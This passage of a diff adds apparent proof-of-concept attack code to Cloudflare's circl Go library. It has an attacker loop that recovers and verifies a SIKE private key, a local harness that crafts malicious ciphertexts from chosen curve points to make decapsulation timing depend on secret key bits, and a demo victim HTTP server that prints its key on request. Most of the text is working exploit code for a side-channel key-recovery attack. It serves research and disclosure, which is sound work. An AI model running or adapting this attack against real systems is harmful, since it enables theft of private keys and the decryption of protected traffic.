++					count_byte = count_byte + 1
++				}
++			}
++			fmt.Println("sk_curr, \n", sk_curr)
++
++			sk := sidh.NewPrivateKey(1, sidh.KeyVariantSike)
++			pk := sidh.NewPublicKey(1, sidh.KeyVariantSike)
++			sk.Scalar = sk_curr
++			sk.GeneratePublicKey(pk)
++			fmt.Println("sk Scalar%v", sk.Scalar)
++
++			if pk.Compare_PublicKey(public_key_server_pt0, public_key_server_pt1, public_key_server_pt2) == 1 {
++				fmt.Println("Recovered sk Scalar!!!!%v", sk.Scalar)
++				for j := uint(0); j < 378; j++ {
++					bit := (sk.Scalar[j>>3] >> (j & 7) & 1)
++					fmt.Printf("%v\n", bit)
++				}
++				SHUT := []byte{'S', 'H', 'U', 'T'}
++				sendSIKE(SHUT)
++				os.Exit(3)
++			}
++		}
++
++		SHUT := []byte{'S', 'H', 'U', 'T'}
++		sendSIKE(SHUT)
++
++	}
++	return
++}
+diff -ruN '--exclude=.git' circl/dh/sidh/POC_ATTACK/sike_local.go circl-modify/dh/sidh/POC_ATTACK/sike_local.go
+--- circl/dh/sidh/POC_ATTACK/sike_local.go	1969-12-31 18:00:00.000000000 -0600
++++ circl-modify/dh/sidh/POC_ATTACK/sike_local.go	2022-02-23 18:49:34.878950213 -0600
+@@ -0,0 +1,299 @@
++package main
++
++import (
++	"crypto/rand"
++	"encoding/hex"
++	"fmt"
++	"math"
++	"os"
++	"strconv"
++	"sync"
++	"time"
++
++	"github.com/cloudflare/circl/dh/sidh"
++	"github.com/cloudflare/circl/dh/sidh/internal/common"
++	"github.com/cloudflare/circl/dh/sidh/internal/p751"
++)
++
++type sikeVec struct {
++	id      uint8
++	name    string
++	kem     *sidh.KEM
++	KatFile string
++	PkB     string
++	PrB     string
++}
++
++// For making sure number_thread decapsulation go routines finish together
++var wg_sike sync.WaitGroup
++
++// Randomly produced 10 secret key, the associated pub key is garbage, since we will generate public key from secret key.
++var keyvec = map[string]sikeVec{
++
++	"Fp751_1": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"E1A758EC0D418BFE86D8077B5BB169133C06C1F2A067D8B202D9D058FFC51F63" +
++			"FD26155A6577C74BA7F1A27E7BA51982517B923615DEB00BE408920A07831DF5" +
++			"978CFDDD0BF690A264353A4A16B666F90586D7F89A193CE09375D389C1379A7A" +
++			"528581C3ACB002CD2DC4F0FD672568FF9050BA8365C7FEFC5E6ED089B921DE68" +
++			"04091A0744DE3EB14D426A3F7DA215C50312617C1C2697243980D06056F2CCE8" +
++			"8AE7AE73C7343C0B7104C9F2870A94FED744CF6E94630514B6CEAB0E64733BB6" +
++			"FA67B931E5D8206010475CBE8BC587248D65D89D8CD9C8BBFA93E8B5F9EB9130" +
++			"773DED665D52ABBD91C4C8C255F73C0FC82501AE33330E9F308DE7177CBF83E4" +
++			"E26E334D7CB09019E638147FC58ED372AF660F14C194BC80E9666325C98E0F80" +
++			"877271D4A6BF514F603703D8A697874CD50A34D92F5AAEA84633CCF96801BD51" +
++			"7BF425DEE4A32AAF06684052473EA14643C3D535440FB2240A988D09F297C5A3" +
++			"88CB3DE60ED943F124034B90EFF611221F80F78EC124956338A105F6636B063D" +
++			"7E48BFBD5D614310FB97D86F122E4AE6F9DDF4977A93ED7D0CE2A94E346A1A03" +
++			"D3219CF21907B85A5BCDC713F93A4406A22E03B1655A66E1F6741A2F953E6FE0" +
++			"868B2614BABEF1943BBBCB1B66D3E7017E533EA84F291240B56AB33EF1DC3F3D" +
++			"E99DBF9E8BE51A0076E462BCDD825EA96D7F63C99177C305C257B31461F4C23D" +
++			"43115F0220409E8880BBB2468586D03461E807BE824B693874911B2B52AF06FD" +
++			"BDC47F5A0159729641A7C950AB9E03F2DC045135",
++		"0001020304050607080900010203040506070809000102030405060708090102" +
++			"8626ED79D451140800E03B59B956F8210E556067407D13DC90FA9E8B872BFB8F" +
++			"AB0A7289852106E40538D3575C500201"},
++
++	"Fp751_2": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"05951FFF0481D50C64B950DEBEC328FA03BC56160E337249E40085CA62463297285326C04CA1329498D9E8C64C285892431C0885426AC0072D19F6E0536FB458C4A7C8E78783DE18B2B023F86B8A9B654393F367CF7BA6CCB70853C6A811522E9DE23FD1AB771DE47AEDBA45FC5254BBFC6E8C3996CF07DF51B6859C8728252D0A0E8BEFCB50E70812B7151A45C5FACEF1192D587C104530C47123C7E3C2AC835CD84CD0B55F520C2A94A32892CCEF5F899C8CBA869D23215F278D0AC256BAF2712733EAC7C5AF7C3DA8A1763ECC1280A7BB8D7B753945A6C8C7C943AF6BCB59AA65330E2985587159836623FEB4F77D85455E6AD247877A37004C8A7771E1AF652A661309176F36B32375059C62828DF7734C1ED6C1CB6BE8537B583DB05137545F44B41DB305B32CE983CC06B7D6B0B7AE65B1434CE87CCFC4A6C1CECAFA4A01537BDC7232E42F5AEB256D2356F026826B0B196C409881DBDB2F5EC9708F23EEEA7D6D3F3626E960F9D155AE8071C2C9C5AF40EFF3F746DEA5B6AB572C74AFC35A025C303858428EFCE81190FBBF490C3F9A5119B6965D2E407782E8F56A04E6D5E59F3C04AC3DE8D9342E5F96D5BB5F83298FE9571355EB70F3774BF9BA98D0D76F8D702855F293AEAC144038D92BDA7E9555B9378E48DC890044615C51A03AA81CF22106D50A695CDB2F65A2FC57D131AE93296A6F743CE44DA901DF2441502066D28316B5620518D58460FD80E5768BDB56DED3DEA43783CD26B18BB774DEA9A627AA105C842D7AA36151419877C657E731",
++		"0001020304060607080900010203040506070809000102030405060708090102" +
++			"DEB963F8B1D8FBDF499D564BA8D2D47915BB402DA02F17031B37B4039A842AFB9B7E48F37200605992BD2429427A7A4E"},
++
++	"Fp751_3": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"05951FFF0481D50C64B950DEBEC328FA03BC56160E337249E40085CA62463297285326C04CA1329498D9E8C64C285892431C0885426AC0072D19F6E0536FB458C4A7C8E78783DE18B2B023F86B8A9B654393F367CF7BA6CCB70853C6A811522E9DE23FD1AB771DE47AEDBA45FC5254BBFC6E8C3996CF07DF51B6859C8728252D0A0E8BEFCB50E70812B7151A45C5FACEF1192D587C104530C47123C7E3C2AC835CD84CD0B55F520C2A94A32892CCEF5F899C8CBA869D23215F278D0AC256BAF2712733EAC7C5AF7C3DA8A1763ECC1280A7BB8D7B753945A6C8C7C943AF6BCB59AA65330E2985587159836623FEB4F77D85455E6AD247877A37004C8A7771E1AF652A661309176F36B32375059C62828DF7734C1ED6C1CB6BE8537B583DB05137545F44B41DB305B32CE983CC06B7D6B0B7AE65B1434CE87CCFC4A6C1CECAFA4A01537BDC7232E42F5AEB256D2356F026826B0B196C409881DBDB2F5EC9708F23EEEA7D6D3F3626E960F9D155AE8071C2C9C5AF40EFF3F746DEA5B6AB572C74AFC35A025C303858428EFCE81190FBBF490C3F9A5119B6965D2E407782E8F56A04E6D5E59F3C04AC3DE8D9342E5F96D5BB5F83298FE9571355EB70F3774BF9BA98D0D76F8D702855F293AEAC144038D92BDA7E9555B9378E48DC890044615C51A03AA81CF22106D50A695CDB2F65A2FC57D131AE93296A6F743CE44DA901DF2441502066D28316B5620518D58460FD80E5768BDB56DED3DEA43783CD26B18BB774DEA9A627AA105C842D7AA36151419877C657E731",
++		"0001020304060607080900010203040506070809000102030405060708090102" +
++			"8E2995F1B3E43853B18916BB1212ACEB05898E2B177A87ABEB928AD7184E59695C56B2CCCF5DB80853C28A525E327D13"},
++
++	"Fp751_4": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"05951FFF0481D50C64B950DEBEC328FA03BC56160E337249E40085CA62463297285326C04CA1329498D9E8C64C285892431C0885426AC0072D19F6E0536FB458C4A7C8E78783DE18B2B023F86B8A9B654393F367CF7BA6CCB70853C6A811522E9DE23FD1AB771DE47AEDBA45FC5254BBFC6E8C3996CF07DF51B6859C8728252D0A0E8BEFCB50E70812B7151A45C5FACEF1192D587C104530C47123C7E3C2AC835CD84CD0B55F520C2A94A32892CCEF5F899C8CBA869D23215F278D0AC256BAF2712733EAC7C5AF7C3DA8A1763ECC1280A7BB8D7B753945A6C8C7C943AF6BCB59AA65330E2985587159836623FEB4F77D85455E6AD247877A37004C8A7771E1AF652A661309176F36B32375059C62828DF7734C1ED6C1CB6BE8537B583DB05137545F44B41DB305B32CE983CC06B7D6B0B7AE65B1434CE87CCFC4A6C1CECAFA4A01537BDC7232E42F5AEB256D2356F026826B0B196C409881DBDB2F5EC9708F23EEEA7D6D3F3626E960F9D155AE8071C2C9C5AF40EFF3F746DEA5B6AB572C74AFC35A025C303858428EFCE81190FBBF490C3F9A5119B6965D2E407782E8F56A04E6D5E59F3C04AC3DE8D9342E5F96D5BB5F83298FE9571355EB70F3774BF9BA98D0D76F8D702855F293AEAC144038D92BDA7E9555B9378E48DC890044615C51A03AA81CF22106D50A695CDB2F65A2FC57D131AE93296A6F743CE44DA901DF2441502066D28316B5620518D58460FD80E5768BDB56DED3DEA43783CD26B18BB774DEA9A627AA105C842D7AA36151419877C657E731",
++		"0001020304060607080900010203040506070809000102030405060708090102" +
++			"9218943C51FD2DE47E509AAC67EFF176795102F37D7A2017E3AFD768FCDA7877AF38739B00FCDF227C2FD62EB635942C"},
++
++	"Fp751_5": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"05951FFF0481D50C64B950DEBEC328FA03BC56160E337249E40085CA62463297285326C04CA1329498D9E8C64C285892431C0885426AC0072D19F6E0536FB458C4A7C8E78783DE18B2B023F86B8A9B654393F367CF7BA6CCB70853C6A811522E9DE23FD1AB771DE47AEDBA45FC5254BBFC6E8C3996CF07DF51B6859C8728252D0A0E8BEFCB50E70812B7151A45C5FACEF1192D587C104530C47123C7E3C2AC835CD84CD0B55F520C2A94A32892CCEF5F899C8CBA869D23215F278D0AC256BAF2712733EAC7C5AF7C3DA8A1763ECC1280A7BB8D7B753945A6C8C7C943AF6BCB59AA65330E2985587159836623FEB4F77D85455E6AD247877A37004C8A7771E1AF652A661309176F36B32375059C62828DF7734C1ED6C1CB6BE8537B583DB05137545F44B41DB305B32CE983CC06B7D6B0B7AE65B1434CE87CCFC4A6C1CECAFA4A01537BDC7232E42F5AEB256D2356F026826B0B196C409881DBDB2F5EC9708F23EEEA7D6D3F3626E960F9D155AE8071C2C9C5AF40EFF3F746DEA5B6AB572C74AFC35A025C303858428EFCE81190FBBF490C3F9A5119B6965D2E407782E8F56A04E6D5E59F3C04AC3DE8D9342E5F96D5BB5F83298FE9571355EB70F3774BF9BA98D0D76F8D702855F293AEAC144038D92BDA7E9555B9378E48DC890044615C51A03AA81CF22106D50A695CDB2F65A2FC57D131AE93296A6F743CE44DA901DF2441502066D28316B5620518D58460FD80E5768BDB56DED3DEA43783CD26B18BB774DEA9A627AA105C842D7AA36151419877C657E731",
++		"0001020304060607080900010203040506070809000102030405060708090102" +
++			"542E20078ADD5296050AF150360F057F6B9AB3BA835589DD56987DE805F900B906505B5390A0D86CBA28038992DFC59A"},
++
++	"Fp751_6": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"05951FFF0481D50C64B950DEBEC328FA03BC56160E337249E40085CA62463297285326C04CA1329498D9E8C64C285892431C0885426AC0072D19F6E0536FB458C4A7C8E78783DE18B2B023F86B8A9B654393F367CF7BA6CCB70853C6A811522E9DE23FD1AB771DE47AEDBA45FC5254BBFC6E8C3996CF07DF51B6859C8728252D0A0E8BEFCB50E70812B7151A45C5FACEF1192D587C104530C47123C7E3C2AC835CD84CD0B55F520C2A94A32892CCEF5F899C8CBA869D23215F278D0AC256BAF2712733EAC7C5AF7C3DA8A1763ECC1280A7BB8D7B753945A6C8C7C943AF6BCB59AA65330E2985587159836623FEB4F77D85455E6AD247877A37004C8A7771E1AF652A661309176F36B32375059C62828DF7734C1ED6C1CB6BE8537B583DB05137545F44B41DB305B32CE983CC06B7D6B0B7AE65B1434CE87CCFC4A6C1CECAFA4A01537BDC7232E42F5AEB256D2356F026826B0B196C409881DBDB2F5EC9708F23EEEA7D6D3F3626E960F9D155AE8071C2C9C5AF40EFF3F746DEA5B6AB572C74AFC35A025C303858428EFCE81190FBBF490C3F9A5119B6965D2E407782E8F56A04E6D5E59F3C04AC3DE8D9342E5F96D5BB5F83298FE9571355EB70F3774BF9BA98D0D76F8D702855F293AEAC144038D92BDA7E9555B9378E48DC890044615C51A03AA81CF22106D50A695CDB2F65A2FC57D131AE93296A6F743CE44DA901DF2441502066D28316B5620518D58460FD80E5768BDB56DED3DEA43783CD26B18BB774DEA9A627AA105C842D7AA36151419877C657E731",
++		"0001020304060607080900010203040506070809000102030405060708090102" +
++			"E3C41CCA6F04CFE7732FD54DE30CC5CAAC93E2F80E76AED7D24A962A3969C1B6A311459A3EC3E510E3E9B1E4291D4D7D"},
++
++	"Fp751_7": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"05951FFF0481D50C64B950DEBEC328FA03BC56160E337249E40085CA62463297285326C04CA1329498D9E8C64C285892431C0885426AC0072D19F6E0536FB458C4A7C8E78783DE18B2B023F86B8A9B654393F367CF7BA6CCB70853C6A811522E9DE23FD1AB771DE47AEDBA45FC5254BBFC6E8C3996CF07DF51B6859C8728252D0A0E8BEFCB50E70812B7151A45C5FACEF1192D587C104530C47123C7E3C2AC835CD84CD0B55F520C2A94A32892CCEF5F899C8CBA869D23215F278D0AC256BAF2712733EAC7C5AF7C3DA8A1763ECC1280A7BB8D7B753945A6C8C7C943AF6BCB59AA65330E2985587159836623FEB4F77D85455E6AD247877A37004C8A7771E1AF652A661309176F36B32375059C62828DF7734C1ED6C1CB6BE8537B583DB05137545F44B41DB305B32CE983CC06B7D6B0B7AE65B1434CE87CCFC4A6C1CECAFA4A01537BDC7232E42F5AEB256D2356F026826B0B196C409881DBDB2F5EC9708F23EEEA7D6D3F3626E960F9D155AE8071C2C9C5AF40EFF3F746DEA5B6AB572C74AFC35A025C303858428EFCE81190FBBF490C3F9A5119B6965D2E407782E8F56A04E6D5E59F3C04AC3DE8D9342E5F96D5BB5F83298FE9571355EB70F3774BF9BA98D0D76F8D702855F293AEAC144038D92BDA7E9555B9378E48DC890044615C51A03AA81CF22106D50A695CDB2F65A2FC57D131AE93296A6F743CE44DA901DF2441502066D28316B5620518D58460FD80E5768BDB56DED3DEA43783CD26B18BB774DEA9A627AA105C842D7AA36151419877C657E731",
++		"0001020304060607080900010203040506070809000102030405060708090102" +
++			"1722219CB5DB47374EB0AF0232C856A57F026F1CB09E5A5799F4C333DD422FF6A0A67C4DA502FAAE727FB2D45DAFCF35"},
++
++	"Fp751_8": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"05951FFF0481D50C64B950DEBEC328FA03BC56160E337249E40085CA62463297285326C04CA1329498D9E8C64C285892431C0885426AC0072D19F6E0536FB458C4A7C8E78783DE18B2B023F86B8A9B654393F367CF7BA6CCB70853C6A811522E9DE23FD1AB771DE47AEDBA45FC5254BBFC6E8C3996CF07DF51B6859C8728252D0A0E8BEFCB50E70812B7151A45C5FACEF1192D587C104530C47123C7E3C2AC835CD84CD0B55F520C2A94A32892CCEF5F899C8CBA869D23215F278D0AC256BAF2712733EAC7C5AF7C3DA8A1763ECC1280A7BB8D7B753945A6C8C7C943AF6BCB59AA65330E2985587159836623FEB4F77D85455E6AD247877A37004C8A7771E1AF652A661309176F36B32375059C62828DF7734C1ED6C1CB6BE8537B583DB05137545F44B41DB305B32CE983CC06B7D6B0B7AE65B1434CE87CCFC4A6C1CECAFA4A01537BDC7232E42F5AEB256D2356F026826B0B196C409881DBDB2F5EC9708F23EEEA7D6D3F3626E960F9D155AE8071C2C9C5AF40EFF3F746DEA5B6AB572C74AFC35A025C303858428EFCE81190FBBF490C3F9A5119B6965D2E407782E8F56A04E6D5E59F3C04AC3DE8D9342E5F96D5BB5F83298FE9571355EB70F3774BF9BA98D0D76F8D702855F293AEAC144038D92BDA7E9555B9378E48DC890044615C51A03AA81CF22106D50A695CDB2F65A2FC57D131AE93296A6F743CE44DA901DF2441502066D28316B5620518D58460FD80E5768BDB56DED3DEA43783CD26B18BB774DEA9A627AA105C842D7AA36151419877C657E731",
++		"0001020304060607080900010203040506070809000102030405060708090102" +
++			"CC7152849C98D5FED2813275D32069E44824ECB14EAEF425CE017448CD9A401C91C06D0F7EED6D22B7BBE8BA6C429EC3"},
++
++	"Fp751_9": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"05951FFF0481D50C64B950DEBEC328FA03BC56160E337249E40085CA62463297285326C04CA1329498D9E8C64C285892431C0885426AC0072D19F6E0536FB458C4A7C8E78783DE18B2B023F86B8A9B654393F367CF7BA6CCB70853C6A811522E9DE23FD1AB771DE47AEDBA45FC5254BBFC6E8C3996CF07DF51B6859C8728252D0A0E8BEFCB50E70812B7151A45C5FACEF1192D587C104530C47123C7E3C2AC835CD84CD0B55F520C2A94A32892CCEF5F899C8CBA869D23215F278D0AC256BAF2712733EAC7C5AF7C3DA8A1763ECC1280A7BB8D7B753945A6C8C7C943AF6BCB59AA65330E2985587159836623FEB4F77D85455E6AD247877A37004C8A7771E1AF652A661309176F36B32375059C62828DF7734C1ED6C1CB6BE8537B583DB05137545F44B41DB305B32CE983CC06B7D6B0B7AE65B1434CE87CCFC4A6C1CECAFA4A01537BDC7232E42F5AEB256D2356F026826B0B196C409881DBDB2F5EC9708F23EEEA7D6D3F3626E960F9D155AE8071C2C9C5AF40EFF3F746DEA5B6AB572C74AFC35A025C303858428EFCE81190FBBF490C3F9A5119B6965D2E407782E8F56A04E6D5E59F3C04AC3DE8D9342E5F96D5BB5F83298FE9571355EB70F3774BF9BA98D0D76F8D702855F293AEAC144038D92BDA7E9555B9378E48DC890044615C51A03AA81CF22106D50A695CDB2F65A2FC57D131AE93296A6F743CE44DA901DF2441502066D28316B5620518D58460FD80E5768BDB56DED3DEA43783CD26B18BB774DEA9A627AA105C842D7AA36151419877C657E731",
++		"0001020304060607080900010203040506070809000102030405060708090102" +
++			"D26CE360D399BF7B89DC364AA7AC06BB513EAB8F527383E93E30727EDC3F22C262AA0EC70257B39EDFF0630DCDC1B79A"},
++
++	"Fp751_10": {
++		common.Fp751, "P-751", sidh.NewSike751(rand.Reader),
++		"",
++		"05951FFF0481D50C64B950DEBEC328FA03BC56160E337249E40085CA62463297285326C04CA1329498D9E8C64C285892431C0885426AC0072D19F6E0536FB458C4A7C8E78783DE18B2B023F86B8A9B654393F367CF7BA6CCB70853C6A811522E9DE23FD1AB771DE47AEDBA45FC5254BBFC6E8C3996CF07DF51B6859C8728252D0A0E8BEFCB50E70812B7151A45C5FACEF1192D587C104530C47123C7E3C2AC835CD84CD0B55F520C2A94A32892CCEF5F899C8CBA869D23215F278D0AC256BAF2712733EAC7C5AF7C3DA8A1763ECC1280A7BB8D7B753945A6C8C7C943AF6BCB59AA65330E2985587159836623FEB4F77D85455E6AD247877A37004C8A7771E1AF652A661309176F36B32375059C62828DF7734C1ED6C1CB6BE8537B583DB05137545F44B41DB305B32CE983CC06B7D6B0B7AE65B1434CE87CCFC4A6C1CECAFA4A01537BDC7232E42F5AEB256D2356F026826B0B196C409881DBDB2F5EC9708F23EEEA7D6D3F3626E960F9D155AE8071C2C9C5AF40EFF3F746DEA5B6AB572C74AFC35A025C303858428EFCE81190FBBF490C3F9A5119B6965D2E407782E8F56A04E6D5E59F3C04AC3DE8D9342E5F96D5BB5F83298FE9571355EB70F3774BF9BA98D0D76F8D702855F293AEAC144038D92BDA7E9555B9378E48DC890044615C51A03AA81CF22106D50A695CDB2F65A2FC57D131AE93296A6F743CE44DA901DF2441502066D28316B5620518D58460FD80E5768BDB56DED3DEA43783CD26B18BB774DEA9A627AA105C842D7AA36151419877C657E731",
++		"0001020304060607080900010203040506070809000102030405060708090102" +
++			"92877D706DAF88EF3412EB143DB8CD91BC047A9A43B7ACDAA42523560DEE4C172697BE4332042FCAB91135839BF74AB2"},
++}
++
++// Perform the decapsulation
++func sike_thread(ssBsz int, ct []byte, pk *sidh.PublicKey, sk *sidh.PrivateKey, ssD [188]byte, v sikeVec) {
++	defer wg_sike.Done()
++	v.kem.Reset()
++	v.kem.Decapsulate(ssD[:ssBsz], sk, pk, ct)
++}
++
++// In our local POC attack, we have 10 randomly generated secret keys. We takes 5 different commandline arguments:
++// keyindex: which secret key we use for this run
++// bitindex: the target bit for this POC attack
++// flipkey: Do we flip the bit at bitindex for this key? Since generating silent 0 stores depending on the xor of bit at [bitindex] and bit at [bitindex-1].
++// One of the flipped key and the original key should give us silent 0 stores. We give this option to demonstrate that by changing a given key at only one bitindex,
++// we can cause the runtime to differ significantly.
++// number_thread: How many number of go routine we want to run simultaneously?
++// iterations: How many iterations we want to run for data collection?
++func main() {
++	all_start := time.Now()
++
++	// Length of secret key is 378 because we are in p751
++	var length_sk uint
++	length_sk = uint(378)
++
++	flipkey, _ := strconv.ParseUint(os.Args[1], 10, 32)
++	keyindex, _ := strconv.ParseUint(os.Args[2], 10, 32)
++	bitindex, _ := strconv.ParseUint(os.Args[3], 10, 32)
++	number_thread, _ := strconv.ParseUint(os.Args[4], 10, 32)
++	iterations, _ := strconv.ParseUint(os.Args[5], 10, 32)
++	fmt.Println("flipkey, \n", flipkey)
++	fmt.Println("keyindex, \n", keyindex)
++	fmt.Println("bitindex, \n", bitindex)
++	fmt.Println("number_thread, \n", number_thread)
++	fmt.Println("iterations, \n", iterations)
++	flipkey_int := int(flipkey)
++	keyindex_int := int(keyindex)
++	bitindex_int := int(bitindex)
++	number_thread_int := int(number_thread)
++	iterations_int := int(iterations)
++	// Target bit
++	bit := uint(bitindex_int)
++
++	val := keyvec["Fp751_"+strconv.Itoa(keyindex_int)]
++	pk, _ := hex.DecodeString(val.PkB)
++	sk, _ := hex.DecodeString(val.PrB)
++
++	var test_sk = sidh.NewPrivateKey(val.id, sidh.KeyVariantSike)
++	_ = test_sk.Import(sk)
++
++	prevBit := uint8(0)
++	for i := uint(0); i < length_sk; i++ {
++		test_bit := (test_sk.Scalar[i>>3] >> (i & 7) & 1)
++		swap := prevBit ^ test_bit
++		prevBit = test_bit
++		if i == bit {
++			if flipkey_int == 1 {
++				swap = 1 - swap
++			}
++			fmt.Println("target swap, \n", swap)
++		}
++	}
++
++	prev_v := val
++	prev_v.kem = sidh.NewSike751(rand.Reader)
++
++	var prev_sk = sidh.NewPrivateKey(prev_v.id, sidh.KeyVariantSike)
++	_ = prev_sk.Import(sk)
++
++	if flipkey_int == 1 {
++		for i := uint(0); i < length_sk; i++ {
++			bit_curr := (prev_sk.Scalar[i>>3] >> (i & 7) & 1)
++			if i == bit {
++				if bit_curr == 1 {
++					prev_sk.Scalar[i>>3] = prev_sk.Scalar[i>>3] - byte(math.Pow(2, float64((i&7))))
++				} else {
++					prev_sk.Scalar[i>>3] = prev_sk.Scalar[i>>3] + byte(math.Pow(2, float64((i&7))))
++				}
++			}
++		}
++	}
++
++	// The starting curve parameters
++	one := common.Fp2{
++		A: common.Fp{
++			0x00000000000249ad, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x8310000000000000,
++			0x5527b1e4375c6c66, 0x697797bf3f4f24d0, 0xc89db7b2ac5c4e2e,
++			0x4ca4b439d2076956, 0x10f7926c7512c7e9, 0x00002d5b24bce5e2},
++	}
++
++	six := common.Fp2{
++		A: common.Fp{
++			0x00000000000DBA10, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x3500000000000000,
++			0x3714FE4EB8399915, 0xC3A2584753EB43F4, 0xA3151D605C520428,
++			0xC116CF5232C7C978, 0x49A84D4B8EFAF6AA, 0x0000305731E97514},
++	}
++
++	cparam := common.ProjectiveCurveParameters{
++		A: six,
++		C: one,
++	}
++
++	var xR0, xR1, xR2 common.Fp2
++	xR0, xR1, xR2 = p751.Prep_ct(&cparam, length_sk, prev_sk.Scalar, bit, 1)
++
++	// Prepare number_thread_int number of ct and v
++	var my_v []sikeVec
++	var my_ssBsz []int
++	var my_ct [][]byte
++	var my_pk []*sidh.PublicKey
++	var my_sk []*sidh.PrivateKey
++	var my_ssD [][188]byte
++
++	for j := 0; j < number_thread_int; j++ {
++		curr_v := val
++		curr_v.kem = sidh.NewSike751(rand.Reader)
++
++		var curr_ssE [common.MaxSharedSecretBsz]byte
++		var curr_ssD [common.MaxSharedSecretBsz]byte
++		var curr_ct = make([]byte, curr_v.kem.CiphertextSize())
++		var curr_ssBsz = curr_v.kem.SharedSecretSize()
++		var curr_sk = sidh.NewPrivateKey(curr_v.id, sidh.KeyVariantSike)
++		var curr_pk = sidh.NewPublicKey(curr_v.id, sidh.KeyVariantSike)
++		_ = curr_sk.Import(sk)
++		_ = curr_pk.Import(pk)
++
++		if flipkey_int == 1 {
++			for i := uint(0); i < length_sk; i++ {
++				bit_curr := (curr_sk.Scalar[i>>3] >> (i & 7) & 1)
++				if i == bit {
++					if bit_curr == 1 {
++						curr_sk.Scalar[i>>3] = curr_sk.Scalar[i>>3] - byte(math.Pow(2, float64((i&7))))
++					} else {
++						curr_sk.Scalar[i>>3] = curr_sk.Scalar[i>>3] + byte(math.Pow(2, float64((i&7))))
++					}
++				}
++			}
++		}
++		curr_sk.GeneratePublicKey(curr_pk)
++
++		var pk_fake = sidh.NewPublicKey(curr_v.id, sidh.KeyVariantSike)
++		pk_fake.Modify_PublicKey(xR0, xR1, xR2)
++
++		var ct_fake = make([]byte, curr_v.kem.CiphertextSize())
++		pk_fake.Export(ct_fake)
++
++		curr_v.kem.Reset()
++		_ = curr_v.kem.Encapsulate(curr_ct, curr_ssE[:], curr_pk)
++
++		copy(curr_ct[:pk_fake.Size()], ct_fake[:pk_fake.Size()])
++
++		my_v = append(my_v, curr_v)
++		my_ssBsz = append(my_ssBsz, curr_ssBsz)
++		my_ct = append(my_ct, curr_ct)
++		my_pk = append(my_pk, curr_pk)
++		my_sk = append(my_sk, curr_sk)
++		my_ssD = append(my_ssD, curr_ssD)
++	}
++
++	all_duration := time.Since(all_start)
++
++	fmt.Println("SET UP", all_duration)
++	// Start the local POC attack
++	for i := 0; i < iterations_int; i++ {
++		all_start := time.Now()
++
++		wg_sike.Add(number_thread_int)
++		for j := uint(0); j < uint(number_thread_int); j++ {
++			go sike_thread(my_ssBsz[j], my_ct[j], my_pk[j], my_sk[j], my_ssD[j], my_v[j])
++		}
++		wg_sike.Wait()
++
++		all_duration := time.Since(all_start)
++		fmt.Println("ALL_DURATION", all_duration)
++	}
++
++	return
++
++}
+diff -ruN '--exclude=.git' circl/dh/sidh/POC_ATTACK/sike_server.go circl-modify/dh/sidh/POC_ATTACK/sike_server.go
+--- circl/dh/sidh/POC_ATTACK/sike_server.go	1969-12-31 18:00:00.000000000 -0600
++++ circl-modify/dh/sidh/POC_ATTACK/sike_server.go	2022-06-05 13:01:14.728359643 -0500
+@@ -0,0 +1,82 @@
++package main
++
++import (
++	"bytes"
++	"crypto/rand"
++	"fmt"
++	"io/ioutil"
++	"log"
++	"net/http"
++	"os"
++
++	"github.com/cloudflare/circl/dh/sidh"
++	"github.com/cloudflare/circl/dh/sidh/internal/common"
++)
++
++type sikeVec struct {
++	id      uint8
++	name    string
++	kem     *sidh.KEM
++	KatFile string
++	PkB     string
++	PrB     string
++}
++
++func main() {
++
++	var v sikeVec
++	v.id = 1
++	v.kem = sidh.NewSike751(rand.Reader)
++	sk := sidh.NewPrivateKey(v.id, sidh.KeyVariantSike)
++	pk := sidh.NewPublicKey(v.id, sidh.KeyVariantSike)
++	sk.Generate(rand.Reader)
++
++	sk.GeneratePublicKey(pk)
++	fmt.Println("public keys!")
++	pk.Print_PublicKey()
++
++	var ssBsz = v.kem.SharedSecretSize()
++
++	SHUT := []byte{'S', 'H', 'U', 'T'}
++	SECRET := []byte{'S', 'E', 'C', 'R', 'E', 'T'}
++
++	// handle `/` route
++	http.HandleFunc("/", func(res http.ResponseWriter, req *http.Request) {
++		v_local := v
++		v_local.kem = sidh.NewSike751(rand.Reader)
++		var ssD [common.MaxSharedSecretBsz]byte
++		body, err := ioutil.ReadAll(req.Body)
++		if err != nil {
++			log.Printf("Error reading body: %v", err)
++			http.Error(res, "can't read body", http.StatusBadRequest)
++			return
++		}
++
++		ct := body
++
++		if bytes.Compare(ct, SHUT) == 0 {
++			fmt.Println("sk Scalar%v", sk.Scalar)
++			for i := uint(0); i < 378; i++ {
++				bit := (sk.Scalar[i>>3] >> (i & 7) & 1)
++				fmt.Printf("%v\n", bit)
++			}
++			os.Exit(3)
++		}
++
++		if bytes.Compare(ct, SECRET) == 0 {
++			fmt.Println("sk Scalar%v", sk.Scalar)
++			for i := uint(0); i < 378; i++ {
++				bit := (sk.Scalar[i>>3] >> (i & 7) & 1)
++				fmt.Printf("%v\n", bit)
++			}
++		} else {
++			v_local.kem.Reset()
++			v_local.kem.Decapsulate(ssD[:ssBsz], sk, pk, ct)
++			fmt.Fprint(res, "SIKE!")
++		}
++	})
++
++	// Run server on port "9000"
++	log.Fatal(http.ListenAndServe(":9000", nil))
++
++}
+diff -ruN '--exclude=.git' circl/dh/sidh/sidh.go circl-modify/dh/sidh/sidh.go
+--- circl/dh/sidh/sidh.go	2022-06-05 15:37:20.757347130 -0500
++++ circl-modify/dh/sidh/sidh.go	2022-02-23 19:05:15.693166552 -0600
+@@ -2,6 +2,7 @@
+ 
+ import (
+ 	"errors"
++	"fmt"
+ 	"io"
+ 
+ 	"github.com/cloudflare/circl/dh/sidh/internal/common"
+@@ -69,6 +70,52 @@
+ 	return &PublicKey{key: key{params: common.Params(id), keyVariant: v}}
+ }
+ 
++// Code from Yingchen
